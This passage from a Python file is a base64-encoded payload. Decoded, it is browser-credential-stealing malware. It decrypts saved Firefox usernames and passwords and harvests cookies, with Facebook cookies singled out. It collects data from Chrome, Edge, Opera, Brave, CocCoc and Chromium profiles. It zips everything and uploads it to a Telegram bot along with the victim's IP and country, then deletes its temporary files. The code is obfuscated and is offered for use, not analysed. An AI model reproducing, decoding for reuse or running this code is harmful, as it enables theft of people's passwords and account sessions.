RhdGEpOgogIGFzbjFkYXRhID0gZGVjb2Rlci5kZWNvZGUoYjY0ZGVjb2RlKGRhdGEpKSAjIGRlY29kYWdlIGJhc2U2NCwgcHVpcyBBU04xCiAga2V5X2lkID0gYXNuMWRhdGFbMF1bMF0uYXNPY3RldHMoKQogIGl2ID0gYXNuMWRhdGFbMF1bMV1bMV0uYXNPY3RldHMoKQogIGNpcGhlcnRleHQgPSBhc24xZGF0YVswXVsyXS5hc09jdGV0cygpCiAgcmV0dXJuIGtleV9pZCwgaXYsIGNpcGhlcnRleHQgCmRlZiBnZXRMb2dpbkRhdGEoYWZrayk6CiAgbG9naW5zID0gW10KICBqc29uX2ZpbGUgPSBvcy5wYXRoLmpvaW4oYWZrayAsImxvZ2lucy5qc29uIikKICBsb2dpbmYgPSBvcGVuKCBqc29uX2ZpbGUsICdyJyxlbmNvZGluZz0ndXRmLTgnKS5yZWFkKCkKICBqc29uTG9naW5zID0ganNvbi5sb2Fkcyhsb2dpbmYpCiAgZm9yIHJvdyBpbiBqc29uTG9naW5zWydsb2dpbnMnXToKICAgIGVuY1VzZXJuYW1lID0gcm93WydlbmNyeXB0ZWRVc2VybmFtZSddCiAgICBlbmNQYXNzd29yZCA9IHJvd1snZW5jcnlwdGVkUGFzc3dvcmQnXQogICAgbG9naW5zLmFwcGVuZCggKGRlY29kZUxvZ2luRGF0YShlbmNVc2VybmFtZSksIGRlY29kZUxvZ2luRGF0YShlbmNQYXNzd29yZCksIHJvd1snaG9zdG5hbWUnXSkgKQogIHJldHVybiBsb2dpbnMKZGVmIGRlY3J5cHRQQkUoZGVjb2RlZEl0ZW0sIGdsb2JhbFNhbHQpOiAjUEJFIHBvdXIgUGFzc3dvcmQgQmFzZWQgRW5jcnlwdGlvbiAKICBwYmVBbGdvID0gc3RyKGRlY29kZWRJdGVtWzBdWzBdWzBdKQogIGlmIHBiZUFsZ28gPT0gJzEuMi44NDAuMTEzNTQ5LjEuMTIuNS4xLjMnOiAjcGJlV2l0aFNoYTFBbmRUcmlwbGVERVMtQ0JDCiAgICBlbnRyeVNhbHQgPSBkZWNvZGVkSXRlbVswXVswXVsxXVswXS5hc09jdGV0cygpCiAgICBjaXBoZXJUID0gZGVjb2RlZEl0ZW1bMF1bMV0uYXNPY3RldHMoKQogICAga2V5ID0gZGVjcnlwdE1vejNERVMoIGdsb2JhbFNhbHQsIGVudHJ5U2FsdCwgY2lwaGVyVCApCiAgICByZXR1cm4ga2V5WzoyNF0KICBlbGlmIHBiZUFsZ28gPT0gJzEuMi44NDAuMTEzNTQ5LjEuNS4xMyc6ICNwa2NzNSBwYmVzMiAgCiAgICBlbnRyeVNhbHQgPSBkZWNvZGVkSXRlbVswXVswXVsxXVswXVsxXVswXS5hc09jdGV0cygpCiAgICBpdGVyYXRpb25Db3VudCA9IGludChkZWNvZGVkSXRlbVswXVswXVsxXVswXVsxXVsxXSkKICAgIGtleUxlbmd0aCA9IGludChkZWNvZGVkSXRlbVswXVswXVsxXVswXVsxXVsyXSkKICAgIGsgPSBzaGExKGdsb2JhbFNhbHQpLmRpZ2VzdCgpCiAgICBrZXkgPSBwYmtkZjJfaG1hYygnc2hhMjU2JywgaywgZW50cnlTYWx0LCBpdGVyYXRpb25Db3VudCwgZGtsZW49a2V5TGVuZ3RoKSAgICAKICAgIGl2ID0gYidceDA0XHgwZScrZGVjb2RlZEl0ZW1bMF1bMF1bMV1bMV1bMV0uYXNPY3RldHMoKQogICAgY2lwaGVyVCA9IGRlY29kZWRJdGVtWzBdWzFdLmFzT2N0ZXRzKCkKICAgIGNsZWFyVGV4dCA9IEFFUy5uZXcoa2V5LCBBRVMuTU9ERV9DQkMsIGl2KS5kZWNyeXB0KGNpcGhlclQpCiAgICByZXR1cm4gY2xlYXJUZXh0CgpkZWYgZ2V0S2V5KGFmayk6ICAKICAgIGNvbm4gPSBzcWxpdGUzLmNvbm5lY3Qob3MucGF0aC5qb2luKGFmaywgImtleTQuZGIiKSkKICAgIGMgPSBjb25uLmN1cnNvcigpCiAgICBjLmV4ZWN1dGUoIlNFTEVDVCBpdGVtMSxpdGVtMiBGUk9NIG1ldGFkYXRhOyIpCgogICAgcm93ID0gYy5mZXRjaG9uZSgpCiAgICBnbG9iYWxTYWx0ID0gcm93WzBdIAogICAgaXRlbTIgPSByb3dbMV0KICAgIGRlY29kZWRJdGVtMiA9IGRlY29kZXIuZGVjb2RlKCBpdGVtMiApIAogICAgY2xlYXJUZXh0ID0gZGVjcnlwdFBCRSggZGVjb2RlZEl0ZW0yLCBnbG9iYWxTYWx0ICkKICAgIAogICAgaWYgY2xlYXJUZXh0ID09IGIncGFzc3dvcmQtY2hlY2tceDAyXHgwMic6IAogICAgICBjLmV4ZWN1dGUoIlNFTEVDVCBhMTEsYTEwMiBGUk9NIG5zc1ByaXZhdGU7IikKICAgICAgZm9yIHJvdyBpbiBjOgogICAgICAgIGlmIHJvd1swXSAhPSBOb25lOgogICAgICAgICAgICBicmVhawogICAgICBhMTEgPSByb3dbMF0KICAgICAgYTEwMiA9IHJvd1sxXSAKICAgICAgaWYgYTEwMiAhPSBOb25lOiAKICAgICAgICBkZWNvZGVkX2ExMSA9IGRlY29kZXIuZGVjb2RlKCBhMTEgKQogICAgICAgIGNsZWFyVGV4dD0gZGVjcnlwdFBCRSggZGVjb2RlZF9hMTEsIGdsb2JhbFNhbHQgKQogICAgICAgIHJldHVybiBjbGVhclRleHRbOjI0XSAgIAogICAgcmV0dXJuIE5vbmUKZGVmIGVuY3J5cHRfZmlyZWZveChwYXRoX2YpOgogICAgdHJ5OgogICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKG9zLnBhdGguam9pbihwYXRoX2YgLCJsb2dpbnMuanNvbiIpKToKICAgICAgICAgICAga2V5ID0gZ2V0S2V5KHBhdGhfZikKICAgICAgICAgICAgbG9naW5zID0gZ2V0TG9naW5EYXRhKHBhdGhfZikKCiAgICAgICAgICAgIGZvciBpIGluIGxvZ2luczoKICAgICAgICAgICAgICAgIHVzZXJuYW1lPSB1bnBhZCggREVTMy5uZXcoIGtleSwgREVTMy5NT0RFX0NCQywgaVswXVsxXSkuZGVjcnlwdChpWzBdWzJdKSw4ICkgCiAgICAgICAgICAgICAgICBwYXNzd29yZD0gdW5wYWQoIERFUzMubmV3KCBrZXksIERFUzMuTU9ERV9DQkMsIGlbMV1bMV0pLmRlY3J5cHQoaVsxXVsyXSksOCApIAogICAgICAgICAgICAgICAgc3RyX3Bhc3MgPSAgcGFzc3dvcmQuZGVjb2RlKCd1dGYtOCcpCiAgICAgICAgICAgICAgICBzdHJfdXNlciA9ICB1c2VybmFtZS5kZWNvZGUoJ3V0Zi04JykKICAgICAgICAgICAgICAgIHdpdGggb3Blbigob3MucGF0aC5qb2luKHBhdGhfZiwicGFzcy50eHQiKSksICdhJyxlbmNvZGluZz0ndXRmLTgnKSBhcyBmOgogICAgICAgICAgICAgICAgICAgIGYud3JpdGUoaVsyXSsiICAgICAgICAgICIrc3RyX3VzZXIgKyAifCIrIHN0cl9wYXNzICsgIlxuIikKICAgIGV4Y2VwdCA6CiAgICAgICAgcGFzcwogICAgdHJ5OgogICAgICAgIGRiX3BhdGggPSBvcy5wYXRoLmpvaW4ocGF0aF9mLCAiY29va2llcy5zcWxpdGUiKQogICAgICAgIGRiID0gc3FsaXRlMy5jb25uZWN0KGRiX3BhdGgpIAogICAgICAgIGRiLnRleHRfZmFjdG9yeSA9IGxhbWJkYSBiOiBiLmRlY29kZShlcnJvcnM9Imlnbm9yZSIpCiAgICAgICAgY3Vyc29yID0gZGIuY3Vyc29yKCkKICAgICAgICBjdXJzb3IuZXhlY3V0ZSgiIiIKICAgICAgICBTRUxFQ1QgaWQgLCBuYW1lLCB2YWx1ZSAsaG9zdAogICAgICAgIEZST00gbW96X2Nvb2tpZXMKICAgICAgICAiIiIpCiAgICAgICAganNvbl9kYXRhID0gW10KICAgICAgICBmb3IgaWQgLCBuYW1lLCB2YWx1ZSAsaG9zdCBpbiBjdXJzb3IuZmV0Y2hhbGwoKToKICAgICAgICAgICAganNvbl9kYXRhLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAiaG9zdCI6IGhvc3QsCiAgICAgICAgICAgICAgICAibmFtZSI6IG5hbWUsCiAgICAgICAgICAgICAgICAidmFsdWUiOiB2YWx1ZQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgIH0pCiAgICAgICAgcmVzdWx0ID0gW10KICAgICAgICBmb3IgaXRlbSBpbiBqc29uX2RhdGE6CiAgICAgICAgICAgIGhvc3QgPSBpdGVtWyJob3N0Il0KICAgICAgICAgICAgbmFtZSA9IGl0ZW1bIm5hbWUiXQogICAgICAgICAgICB2YWx1ZSA9IGl0ZW1bInZhbHVlIl0KICAgICAgICAgICAgaWYgaG9zdCA9PSAiLmZhY2Vib29rLmNvbSI6CiAgICAgICAgICAgICAgICByZXN1bHQuYXBwZW5kKGYie25hbWV9ID0ge3ZhbHVlfSIpCiAgICAgICAgICAgIGNvb2tpZSA9IGYie2hvc3R9XHRcdHsnLyd9XHRcdFx0e25hbWV9XHR7dmFsdWV9XG4iICAgICAgICAgIAogICAgICAgICAgICB3aXRoIG9wZW4oKG9zLnBhdGguam9pbihwYXRoX2YsICJjb29raWUudHh0IikpLCAnYScpIGFzIGY6CiAgICAgICAgICAgICAgICBmLndyaXRlKGNvb2tpZSkKICAgICAgICByZXN1bHRfc3RyaW5nID0gIjsgIi5qb2luKHJlc3VsdCkKICAgICAgICB3aXRoIG9wZW4oKG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJURU1QIl0sIG5hbWVfZiwgImNvb2tpZWZiLnR4dCIpKSwgJ2EnLGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgICAgIGYud3JpdGUocmVzdWx0X3N0cmluZysiXG4iICsgICJcbiIpCiAgICBleGNlcHQ6CiAgICAgICAgcGFzcwogICAgCmRlZiBkZWxldGVfZmlyZWZveChkYXRhX2ZpcmVmb3hfcHJvZmlsZSk6CiAgICAKICAgIHRyeToKICAgICAgICBlbmNyeXB0X2ZpcmVmb3goZGF0YV9maXJlZm94X3Byb2ZpbGUpCiAgICBleGNlcHQ6IHBhc3MKICAgCmRlZiBkZW1zbygpIDoKICAgIHBhdGhfZGVtc28gPSByIkM6XFVzZXJzXFB1YmxpY1xEb2N1bWVudFxudW1iZXIudHh0IgogICAgaWYgb3MucGF0aC5leGlzdHMocGF0aF9kZW1zbyk6CiAgICAgICAgd2l0aCBvcGVuKHBhdGhfZGVtc28sICdyJykgYXMgZmlsZToKICAgICAgICAgICAgbnVtYmVyID0gZmlsZS5yZWFkKCkKICAgICAgICBudW1iZXIgPSBpbnQobnVtYmVyKSsxCiAgICAgICAgd2l0aCBvcGVuKHBhdGhfZGVtc28sICd3JykgYXMgZmlsZToKICAgICAgICAgICAgYWJjID0gc3RyKG51bWJlcikKICAgICAgICAgICAgZmlsZS53cml0ZShhYmMpCiAgICBlbHNlOgogICAgICAgIHdpdGggb3BlbihwYXRoX2RlbXNvLCAndycpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGUud3JpdGUoIjEiKQogICAgICAgICAgICBudW1iZXIgPSAxCiAgICByZXR1cm4gbnVtYmVyCgoKZGVmIGlkKCkgOgogICAgcGF0aF9pZCA9IHIiQzpcVXNlcnNcUHVibGljXERvY3VtZW50XGlkLnR4dCIKICAgIGlmIG9zLnBhdGguZXhpc3RzKHBhdGhfaWQpOgogICAgICAgIHdpdGggb3BlbihwYXRoX2lkLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIGlkID0gZmlsZS5yZWFkKCkKICAgIGVsc2U6CiAgICAgICAgcmFuZG9tX251bWJlciA9IHJhbmRvbS5yYW5kaW50KDEwKioxNCwgMTAqKjE1IC0gMSkKICAgICAgICBpZCA9IHN0cihyYW5kb21fbnVtYmVyKQogICAgICAgIHdpdGggb3BlbihwYXRoX2lkLCAndycpIGFzIGZpbGU6CiAgICAgICAgICAgIGZpbGUud3JpdGUoaWQpCiAgICByZXR1cm4gaWQKZGVmIHRpbWUxMSgpIDoKICAgIGN1cnJlbnRfdGltZSA9IGRhdGV0aW1lLm5vdygpCiAgICBmb3JtYXR0ZWRfdGltZSA9IGN1cnJlbnRfdGltZS5zdHJmdGltZSgiJUg6JU0sICVkLyVtLyVZIikKICAgIGZvcm1hdHRlZF90aW1lMiA9IGRhdGV0aW1lLnN0cnB0aW1lKGZvcm1hdHRlZF90aW1lLCAiJUg6JU0sICVkLyVtLyVZIikKICAgIHBhdGhfdGltZSA9IHIiQzpcVXNlcnNcUHVibGljXERvY3VtZW50XHRpbWUudHh0IgogICAgaWYgb3MucGF0aC5leGlzdHMocGF0aF90aW1lKToKICAgICAgICB3aXRoIG9wZW4ocGF0aF90aW1lLCAncicpIGFzIGZpbGU6CiAgICAgICAgICAgIHRpbWVfc3RyID0gZmlsZS5yZWFkKCkuc3RyaXAoKQogICAgICAgICAgICBmaWxlX3RpbWUgPSBkYXRldGltZS5zdHJwdGltZSh0aW1lX3N0ciwgIiVIOiVNLCAlZC8lbS8lWSIpCiAgICAgICAgCiAgICAgICAgdGltZV9kaWZmID0gZm9ybWF0dGVkX3RpbWUyIC0gZmlsZV90aW1lCiAgICAgICAgaWYgdGltZV9kaWZmIDwgdGltZWRlbHRhKG1pbnV0ZXM9MzApOgogICAgICAgICAgICBhID0gMAogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGEgPSAxCiAgICAKICAgIGVsc2UgOgogICAgICAgIHdpdGggb3BlbihwYXRoX3RpbWUsICd3JykgYXMgZmlsZToKICAgICAgICAgICAgZmlsZS53cml0ZShmb3JtYXR0ZWRfdGltZSArICdcbicpCiAgICAgICAgICAgIGEgPSAxCiAgICByZXR1cm4gYQoKZGVmIG1haW4oKToKICAgIG51bWJlciA9ICJEYXRhIEzhuqduIFRo4bupOiAiICsgc3RyKGRlbXNvKCkpCiAgICAKICAgIHUxID0gJ2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3QnK2FwaWJvdDErJy9zZW5kRG9jdW1lbnQnCiAgICBkYXRhX3BhdGggPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVEVNUCJdLCBuYW1lX2YpO29zLm1rZGlyKGRhdGFfcGF0aCkKICAgCiAgICBjaHJvbWUgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiR29vZ2xlIiwgIkNocm9tZSIsICJVc2VyIERhdGEiKQogICAgZmlyZWZveCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJVU0VSUFJPRklMRSJdLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwiTW96aWxsYSIsICJGaXJlZm94IiwgIlByb2ZpbGVzIikKICAgIEVkZ2UgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiTWljcm9zb2Z0IiwgIkVkZ2UiLCAiVXNlciBEYXRhIikKICAgIE9wZXJhID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIlJvYW1pbmciLCAiT3BlcmEgU29mdHdhcmUiLCAiT3BlcmEgU3RhYmxlIikKICAgIEJyYXZlID0gb3MucGF0aC5qb2luKG9zLmVudmlyb25bIlVTRVJQUk9GSUxFIl0sICJBcHBEYXRhIiwgIkxvY2FsIiwiQnJhdmVTb2Z0d2FyZSIsICJCcmF2ZS1Ccm93c2VyIiwgIlVzZXIgRGF0YSIpCiAgICBjb2Njb2MgPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCJDb2NDb2MiLCAiQnJvd3NlciIsICJVc2VyIERhdGEiKQogICAgY2hyb21pdW0gPSBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsiVVNFUlBST0ZJTEUiXSwgIkFwcERhdGEiLCAiTG9jYWwiLCJDaHJvbWl1bSIsICJVc2VyIERhdGEiKQogICAgaWYgb3MucGF0aC5leGlzdHMoY2hyb21lKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGdldF9jaHJvbWUoZGF0YV9wYXRoLGNocm9tZSkKICAgICAgICBleGNlcHQ6IHBhc3MKICAgIGlmIG9zLnBhdGguZXhpc3RzKEVkZ2UpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZ2V0X2VkZ2UoZGF0YV9wYXRoLEVkZ2UpCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICAgICAgCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhPcGVyYSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBnZXRfb3BlcmEoZGF0YV9wYXRoLE9wZXJhKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgIAogICAgaWYgb3MucGF0aC5leGlzdHMoQnJhdmUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZ2V0X2JyYXZlKGRhdGFfcGF0aCxCcmF2ZSkKICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgICAKICAgIGlmIG9zLnBhdGguZXhpc3RzKGNvY2NvYyk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICAgZ2V0X2NvY2NvYyhkYXRhX3BhdGgsY29jY29jKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgICAgCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhmaXJlZm94KToKICAgICAgICB0cnk6CiAgICAgICAgICAgICBnZXRfZmlyZWZveChkYXRhX3BhdGgsZmlyZWZveCkKICAgICAgICBleGNlcHQ6IHBhc3MKICAgICAgIAogICAgaWYgb3MucGF0aC5leGlzdHMoY2hyb21pdW0pOgogICAgICAgIHRyeToKICAgICAgICAgICBnZXRfY2hyb21pdW0oZGF0YV9wYXRoLGNocm9taXVtKSAgCiAgICAgICAgZXhjZXB0OiBwYXNzIAogICAgRG9jdW1lbnRfcGF0aCA9IHInQzpcVXNlcnNcUHVibGljXERvY3VtZW50LnppcCcKIAogICAgel9waCA9IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWyJURU1QIl0sIG5hbWVfZiArJy56aXAnKTtzaHV0aWwubWFrZV9hcmNoaXZlKHpfcGhbOi00XSwgJ3ppcCcsIGRhdGFfcGF0aCkKICAgCiAgICB3aXRoIG9wZW4oel9waCwgJ3JiJykgYXMgZjoKICAgICAgICB4MDEucG9zdCh1MSxkYXRhPXsnY2FwdGlvbic6ICJcbiIrIlThu4luaC9DaXR5OiAgIiArdGVuX2NvdW50cnkgKyJcbiIgKyJpZCA6ICAiICsgaWQoKSArIlxuIisgd2luZG93c192ZXJzaW9uICsiLS0iK2lwICsgIlxuIisgbnVtYmVyLCdjaGF0X2lkJzogaWQxfSxmaWxlcz17J2RvY3VtZW50JzogZn0pCgogICAgCiAgICBzaHV0aWwucm10cmVlKG9zLmVudmlyb25bIlRFTVAiXSwgbmFtZV9mICsnLnppcCcpO3NodXRpbC5ybXRyZWUob3MuZW52aXJvblsiVEVNUCJdLCBuYW1lX2YpCiAgICBpZiBvcy5wYXRoLmV4aXN0cyhEb2N1bWVudF9wYXRoKToKICAgICAgICBvcy5yZW1vdmUoRG9jdW1lbnRfcGF0aCkKICAgIAoKaWYoZGF0YVsnc3RhdHVzJ10gPT0gJzEnKToKICAgIGlmKGRhdGFbJ3ZuJ10gIT0gJ3llcycpOgogICAgICAgIGlmKGNvdW50cnlfY29kZSA9PSAnVk4nKToKICAgICAgICAgICAgZiA9IG9wZW4oJ3dhdGNoLnR4dCcsICd3JywgZW5jb2Rpbmc9InV0Zi04IikKICAgICAgICAgICAgZi53cml0ZSgnWGluIGNow6BvIFZOIScpCiAgICAgICAgZWxzZToKICAgICAgICAgICAgbWFpbigpCiAgICBlbHNlOgogICAgICAgIG1haW4oKQplbGlmKGRhdGFbJ3N0YXR1cyddID09ICcyJyk6CiAgICBwcmludCgnQm90bmV0IMSQw6MgTmfhu6tuZyBIb+G6oXQgxJDhu5luZycpCmVsc2U6CiAgICBwcmludCgnS+G6v3QgbuG7kWkgduG7m2kgRmFwZXIgdGjhuqV0IGLhuqFpJykgICAg''').decode('utf-8'))